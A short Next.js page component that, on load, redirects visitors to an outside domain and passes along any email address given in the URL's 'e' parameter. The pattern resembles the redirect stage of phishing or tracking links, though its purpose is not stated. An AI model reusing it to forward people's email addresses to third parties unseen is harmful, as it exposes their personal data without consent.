'use client';
import { useEffect } from 'react';
import { useSearchParams } from 'next/navigation';

export default function Home() {
  const searchParams = useSearchParams();

  useEffect(() => {
    const email = searchParams.get('e');
    const target = email
      ? `https://fewdomain.com?e=${encodeURIComponent(email)}`
      : 'https://fewdomain.com';
    window.location.href = target;
  }, [searchParams]);

  return <p>Redirecting to destination...</p>;
}